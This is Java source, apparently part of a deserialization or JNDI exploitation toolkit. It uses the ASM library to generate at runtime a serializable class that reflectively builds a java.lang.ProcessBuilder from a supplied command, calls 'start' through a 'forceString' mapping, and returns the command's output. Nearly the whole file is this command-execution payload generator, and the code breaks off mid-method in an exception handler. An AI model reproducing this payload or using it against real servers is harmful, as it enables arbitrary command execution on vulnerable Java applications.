package com.feihong.asm;

import org.objectweb.asm.*;

public class GenerateDynamicClass extends ClassLoader{
    private String className;
    private String cmd;

    public GenerateDynamicClass(String className, String cmd){
        this.className = className;
        this.cmd = cmd;
    }

    public byte[] generate() {

        MethodVisitor methodVisitor;
        FieldVisitor fieldVisitor;
        //定义一个叫做Example的类
        ClassWriter classWriter = new ClassWriter(0);


        classWriter.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC | Opcodes.ACC_SUPER, className, null, "java/lang/Object", new String[] { "java/io/Serializable" });

        classWriter.visitInnerClass("java/util/Map$Entry", "java/util/Map", "Entry", Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC | Opcodes.ACC_ABSTRACT | Opcodes.ACC_INTERFACE);

        {
            fieldVisitor = classWriter.visitField(Opcodes.ACC_PRIVATE | Opcodes.ACC_FINAL | Opcodes.ACC_STATIC, "serialVersionUID", "J", null, new Long(-1878443566818256475L));
            fieldVisitor.visitEnd();
        }
        {
            fieldVisitor = classWriter.visitField(Opcodes.ACC_PRIVATE, "name", "Ljava/lang/String;", null, null);
            fieldVisitor.visitEnd();
        }
        {
            fieldVisitor = classWriter.visitField(Opcodes.ACC_PRIVATE, "args", "Ljava/util/List;", "Ljava/util/List<Ljava/lang/Object;>;", null);
            fieldVisitor.visitEnd();
        }
        {
            fieldVisitor = classWriter.visitField(Opcodes.ACC_PRIVATE, "map", "Ljava/util/HashMap;", "Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;", null);
            fieldVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(15, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(16, label1);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitLdcInsn("java.lang.ProcessBuilder");
            methodVisitor.visitFieldInsn(Opcodes.PUTFIELD, className, "name", "Ljava/lang/String;");
            Label label2 = new Label();
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(17, label2);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitLdcInsn(cmd);
            methodVisitor.visitLdcInsn(",");
            methodVisitor.visitInsn(Opcodes.ICONST_3);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "split", "(Ljava/lang/String;I)[Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESTATIC, "java/util/Arrays", "asList", "([Ljava/lang/Object;)Ljava/util/List;", false);
            methodVisitor.visitFieldInsn(Opcodes.PUTFIELD, className, "args", "Ljava/util/List;");
            Label label3 = new Label();
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(18, label3);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/util/LinkedHashMap");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/util/LinkedHashMap", "<init>", "()V", false);
            methodVisitor.visitFieldInsn(Opcodes.PUTFIELD, className, "map", "Ljava/util/HashMap;");
            Label label4 = new Label();
            methodVisitor.visitLabel(label4);
            methodVisitor.visitLineNumber(19, label4);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "map", "Ljava/util/HashMap;");
            methodVisitor.visitLdcInsn("forceString");
            methodVisitor.visitLdcInsn("start");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/HashMap", "put", "(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitInsn(Opcodes.POP);
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            methodVisitor.visitLineNumber(21, label5);
            methodVisitor.visitInsn(Opcodes.RETURN);
            Label label6 = new Label();
            methodVisitor.visitLabel(label6);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label6, 0);
            methodVisitor.visitMaxs(4, 1);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "getName", "()Ljava/lang/String;", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(24, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "name", "Ljava/lang/String;");
            methodVisitor.visitInsn(Opcodes.ARETURN);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label1, 0);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "setName", "(Ljava/lang/String;)V", null, null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(28, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitFieldInsn(Opcodes.PUTFIELD, className, "name", "Ljava/lang/String;");
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(29, label1);
            methodVisitor.visitInsn(Opcodes.RETURN);
            Label label2 = new Label();
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label2, 0);
            methodVisitor.visitLocalVariable("name", "Ljava/lang/String;", null, label0, label2, 1);
            methodVisitor.visitMaxs(2, 2);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "getArgs", "()Ljava/util/List;", "()Ljava/util/List<Ljava/lang/Object;>;", null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(32, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "args", "Ljava/util/List;");
            methodVisitor.visitInsn(Opcodes.ARETURN);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label1, 0);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "setArgs", "(Ljava/util/List;)V", "(Ljava/util/List<Ljava/lang/Object;>;)V", null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(36, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitFieldInsn(Opcodes.PUTFIELD, className, "args", "Ljava/util/List;");
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(37, label1);
            methodVisitor.visitInsn(Opcodes.RETURN);
            Label label2 = new Label();
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label2, 0);
            methodVisitor.visitLocalVariable("args", "Ljava/util/List;", "Ljava/util/List<Ljava/lang/Object;>;", label0, label2, 1);
            methodVisitor.visitMaxs(2, 2);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "getMap", "()Ljava/util/HashMap;", "()Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;", null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(40, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "map", "Ljava/util/HashMap;");
            methodVisitor.visitInsn(Opcodes.ARETURN);
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label1, 0);
            methodVisitor.visitMaxs(1, 1);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "setMap", "(Ljava/util/HashMap;)V", "(Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;)V", null);
            methodVisitor.visitCode();
            Label label0 = new Label();
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(44, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitFieldInsn(Opcodes.PUTFIELD, className, "map", "Ljava/util/HashMap;");
            Label label1 = new Label();
            methodVisitor.visitLabel(label1);
            methodVisitor.visitLineNumber(45, label1);
            methodVisitor.visitInsn(Opcodes.RETURN);
            Label label2 = new Label();
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLocalVariable("this", "L" + className + ";", null, label0, label2, 0);
            methodVisitor.visitLocalVariable("map", "Ljava/util/HashMap;", "Ljava/util/HashMap<Ljava/lang/String;Ljava/lang/String;>;", label0, label2, 1);
            methodVisitor.visitMaxs(2, 2);
            methodVisitor.visitEnd();
        }
        {
            methodVisitor = classWriter.visitMethod(Opcodes.ACC_PUBLIC, "process", "()Ljava/lang/String;", null, new String[] { "java/lang/Exception" });
            methodVisitor.visitCode();
            Label label0 = new Label();
            Label label1 = new Label();
            Label label2 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label2, "java/lang/ClassNotFoundException");
            Label label3 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label3, "java/lang/NoSuchMethodException");
            Label label4 = new Label();
            methodVisitor.visitTryCatchBlock(label0, label1, label4, "java/lang/Exception");
            Label label5 = new Label();
            methodVisitor.visitLabel(label5);
            methodVisitor.visitLineNumber(48, label5);
            methodVisitor.visitInsn(Opcodes.ACONST_NULL);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 1);
            Label label6 = new Label();
            methodVisitor.visitLabel(label6);
            methodVisitor.visitLineNumber(49, label6);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "name", "Ljava/lang/String;");
            Label label7 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IFNONNULL, label7);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "map", "Ljava/util/HashMap;");
            methodVisitor.visitJumpInsn(Opcodes.IFNONNULL, label7);
            Label label8 = new Label();
            methodVisitor.visitLabel(label8);
            methodVisitor.visitLineNumber(50, label8);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/lang/Exception");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitLdcInsn("Initialized error.");
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Exception", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitInsn(Opcodes.ATHROW);
            methodVisitor.visitLabel(label7);
            methodVisitor.visitLineNumber(53, label7);
            methodVisitor.visitFrame(Opcodes.F_APPEND,1, new Object[] {"java/lang/Class"}, 0, null);
            methodVisitor.visitInsn(Opcodes.ACONST_NULL);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 2);
            methodVisitor.visitLabel(label0);
            methodVisitor.visitLineNumber(55, label0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "name", "Ljava/lang/String;");
            methodVisitor.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 1);
            Label label9 = new Label();
            methodVisitor.visitLabel(label9);
            methodVisitor.visitLineNumber(56, label9);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getConstructors", "()[Ljava/lang/reflect/Constructor;", false);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitInsn(Opcodes.AALOAD);
            methodVisitor.visitInsn(Opcodes.ICONST_1);
            methodVisitor.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "args", "Ljava/util/List;");
            methodVisitor.visitInsn(Opcodes.AASTORE);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Constructor", "newInstance", "([Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 3);
            Label label10 = new Label();
            methodVisitor.visitLabel(label10);
            methodVisitor.visitLineNumber(58, label10);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethods", "()[Ljava/lang/reflect/Method;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 4);
            Label label11 = new Label();
            methodVisitor.visitLabel(label11);
            methodVisitor.visitLineNumber(59, label11);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 4);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 5);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 5);
            methodVisitor.visitInsn(Opcodes.ARRAYLENGTH);
            methodVisitor.visitVarInsn(Opcodes.ISTORE, 6);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitVarInsn(Opcodes.ISTORE, 7);
            Label label12 = new Label();
            methodVisitor.visitLabel(label12);
            methodVisitor.visitFrame(Opcodes.F_FULL, 8, new Object[] {className, "java/lang/Class", "java/lang/String", "java/lang/Object", "[Ljava/lang/reflect/Method;", "[Ljava/lang/reflect/Method;", Opcodes.INTEGER, Opcodes.INTEGER}, 0, new Object[] {});
            methodVisitor.visitVarInsn(Opcodes.ILOAD, 7);
            methodVisitor.visitVarInsn(Opcodes.ILOAD, 6);
            Label label13 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IF_ICMPGE, label13);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 5);
            methodVisitor.visitVarInsn(Opcodes.ILOAD, 7);
            methodVisitor.visitInsn(Opcodes.AALOAD);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 8);
            Label label14 = new Label();
            methodVisitor.visitLabel(label14);
            methodVisitor.visitLineNumber(60, label14);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 8);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "getName", "()Ljava/lang/String;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 2);
            Label label15 = new Label();
            methodVisitor.visitLabel(label15);
            methodVisitor.visitLineNumber(62, label15);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 2);
            methodVisitor.visitLdcInsn("set");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "startsWith", "(Ljava/lang/String;)Z", false);
            Label label16 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IFEQ, label16);
            Label label17 = new Label();
            methodVisitor.visitLabel(label17);
            methodVisitor.visitLineNumber(63, label17);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 2);
            methodVisitor.visitInsn(Opcodes.ICONST_3);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "substring", "(I)Ljava/lang/String;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 9);
            Label label18 = new Label();
            methodVisitor.visitLabel(label18);
            methodVisitor.visitLineNumber(64, label18);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "map", "Ljava/util/HashMap;");
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 9);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/HashMap", "get", "(Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitJumpInsn(Opcodes.IFNULL, label16);
            Label label19 = new Label();
            methodVisitor.visitLabel(label19);
            methodVisitor.visitLineNumber(65, label19);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 8);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 3);
            methodVisitor.visitInsn(Opcodes.ICONST_1);
            methodVisitor.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 9);
            methodVisitor.visitInsn(Opcodes.AASTORE);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitInsn(Opcodes.POP);
            methodVisitor.visitLabel(label16);
            methodVisitor.visitLineNumber(59, label16);
            methodVisitor.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
            methodVisitor.visitIincInsn(7, 1);
            methodVisitor.visitJumpInsn(Opcodes.GOTO, label12);
            methodVisitor.visitLabel(label13);
            methodVisitor.visitLineNumber(70, label13);
            methodVisitor.visitFrame(Opcodes.F_CHOP,3, null, 0, null);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/util/ArrayList");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/util/ArrayList", "<init>", "()V", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 5);
            Label label20 = new Label();
            methodVisitor.visitLabel(label20);
            methodVisitor.visitLineNumber(72, label20);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/lang/StringBuilder");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 6);
            Label label21 = new Label();
            methodVisitor.visitLabel(label21);
            methodVisitor.visitLineNumber(73, label21);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "map", "Ljava/util/HashMap;");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/util/HashMap", "entrySet", "()Ljava/util/Set;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEINTERFACE, "java/util/Set", "iterator", "()Ljava/util/Iterator;", true);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 7);
            Label label22 = new Label();
            methodVisitor.visitLabel(label22);
            methodVisitor.visitFrame(Opcodes.F_APPEND,3, new Object[] {"java/util/List", "java/lang/StringBuilder", "java/util/Iterator"}, 0, null);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 7);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEINTERFACE, "java/util/Iterator", "hasNext", "()Z", true);
            Label label23 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IFEQ, label23);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 7);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEINTERFACE, "java/util/Iterator", "next", "()Ljava/lang/Object;", true);
            methodVisitor.visitTypeInsn(Opcodes.CHECKCAST, "java/util/Map$Entry");
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 8);
            Label label24 = new Label();
            methodVisitor.visitLabel(label24);
            methodVisitor.visitLineNumber(74, label24);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 8);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEINTERFACE, "java/util/Map$Entry", "getKey", "()Ljava/lang/Object;", true);
            methodVisitor.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
            methodVisitor.visitLdcInsn("forceString");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "equals", "(Ljava/lang/Object;)Z", false);
            Label label25 = new Label();
            methodVisitor.visitJumpInsn(Opcodes.IFEQ, label25);
            Label label26 = new Label();
            methodVisitor.visitLabel(label26);
            methodVisitor.visitLineNumber(75, label26);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 8);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEINTERFACE, "java/util/Map$Entry", "getValue", "()Ljava/lang/Object;", true);
            methodVisitor.visitTypeInsn(Opcodes.CHECKCAST, "java/lang/String");
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 9);
            Label label27 = new Label();
            methodVisitor.visitLabel(label27);
            methodVisitor.visitLineNumber(77, label27);
            methodVisitor.visitInsn(Opcodes.ACONST_NULL);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 10);
            Label label28 = new Label();
            methodVisitor.visitLabel(label28);
            methodVisitor.visitLineNumber(78, label28);
            methodVisitor.visitInsn(Opcodes.ACONST_NULL);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 11);
            Label label29 = new Label();
            methodVisitor.visitLabel(label29);
            methodVisitor.visitLineNumber(79, label29);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 9);
            methodVisitor.visitLdcInsn(",");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "split", "(Ljava/lang/String;)[Ljava/lang/String;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 12);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 12);
            methodVisitor.visitInsn(Opcodes.ARRAYLENGTH);
            methodVisitor.visitVarInsn(Opcodes.ISTORE, 13);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitVarInsn(Opcodes.ISTORE, 14);
            Label label30 = new Label();
            methodVisitor.visitLabel(label30);
            methodVisitor.visitFrame(Opcodes.F_FULL, 15, new Object[] {className, "java/lang/Class", "java/lang/String", "java/lang/Object", "[Ljava/lang/reflect/Method;", "java/util/List", "java/lang/StringBuilder", "java/util/Iterator", "java/util/Map$Entry", "java/lang/String", "java/lang/reflect/Method", "java/lang/Object", "[Ljava/lang/String;", Opcodes.INTEGER, Opcodes.INTEGER}, 0, new Object[] {});
            methodVisitor.visitVarInsn(Opcodes.ILOAD, 14);
            methodVisitor.visitVarInsn(Opcodes.ILOAD, 13);
            methodVisitor.visitJumpInsn(Opcodes.IF_ICMPGE, label25);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 12);
            methodVisitor.visitVarInsn(Opcodes.ILOAD, 14);
            methodVisitor.visitInsn(Opcodes.AALOAD);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 15);
            Label label31 = new Label();
            methodVisitor.visitLabel(label31);
            methodVisitor.visitLineNumber(80, label31);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 15);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "trim", "()Ljava/lang/String;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 15);
            Label label32 = new Label();
            methodVisitor.visitLabel(label32);
            methodVisitor.visitLineNumber(81, label32);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 1);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 15);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 10);
            Label label33 = new Label();
            methodVisitor.visitLabel(label33);
            methodVisitor.visitLineNumber(82, label33);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 10);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 3);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 11);
            Label label34 = new Label();
            methodVisitor.visitLabel(label34);
            methodVisitor.visitLineNumber(84, label34);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 11);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getSuperclass", "()Ljava/lang/Class;", false);
            methodVisitor.visitLdcInsn("getInputStream");
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Class");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 11);
            methodVisitor.visitInsn(Opcodes.ICONST_0);
            methodVisitor.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            methodVisitor.visitTypeInsn(Opcodes.CHECKCAST, "java/io/InputStream");
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 16);
            Label label35 = new Label();
            methodVisitor.visitLabel(label35);
            methodVisitor.visitLineNumber(85, label35);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 6);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 16);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, className, "getString", "(Ljava/io/InputStream;)Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitInsn(Opcodes.POP);
            Label label36 = new Label();
            methodVisitor.visitLabel(label36);
            methodVisitor.visitLineNumber(79, label36);
            methodVisitor.visitIincInsn(14, 1);
            methodVisitor.visitJumpInsn(Opcodes.GOTO, label30);
            methodVisitor.visitLabel(label25);
            methodVisitor.visitLineNumber(88, label25);
            methodVisitor.visitFrame(Opcodes.F_FULL, 8, new Object[] {className, "java/lang/Class", "java/lang/String", "java/lang/Object", "[Ljava/lang/reflect/Method;", "java/util/List", "java/lang/StringBuilder", "java/util/Iterator"}, 0, new Object[] {});
            methodVisitor.visitJumpInsn(Opcodes.GOTO, label22);
            methodVisitor.visitLabel(label23);
            methodVisitor.visitLineNumber(89, label23);
            methodVisitor.visitFrame(Opcodes.F_CHOP,1, null, 0, null);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 6);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            methodVisitor.visitLabel(label1);
            methodVisitor.visitInsn(Opcodes.ARETURN);
            methodVisitor.visitLabel(label2);
            methodVisitor.visitLineNumber(91, label2);
            methodVisitor.visitFrame(Opcodes.F_FULL, 3, new Object[] {className, "java/lang/Class", "java/lang/String"}, 1, new Object[] {"java/lang/ClassNotFoundException"});
            methodVisitor.visitVarInsn(Opcodes.ASTORE, 3);
            Label label37 = new Label();
            methodVisitor.visitLabel(label37);
            methodVisitor.visitLineNumber(92, label37);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/lang/Exception");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitTypeInsn(Opcodes.NEW, "java/lang/StringBuilder");
            methodVisitor.visitInsn(Opcodes.DUP);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/StringBuilder", "<init>", "()V", false);
            methodVisitor.visitLdcInsn("class name not found: ");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitVarInsn(Opcodes.ALOAD, 0);
            methodVisitor.visitFieldInsn(Opcodes.GETFIELD, className, "name", "Ljava/lang/String;");
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "append", "(Ljava/lang/String;)Ljava/lang/StringBuilder;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/StringBuilder", "toString", "()Ljava/lang/String;", false);
            methodVisitor.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Exception", "<init>", "(Ljava/lang/String;)V", false);
            methodVisitor.visitInsn(Opcodes.ATHROW);
            methodVisitor.visitLabel(label3);
            methodVisitor.visitLineNumber(93, label3);
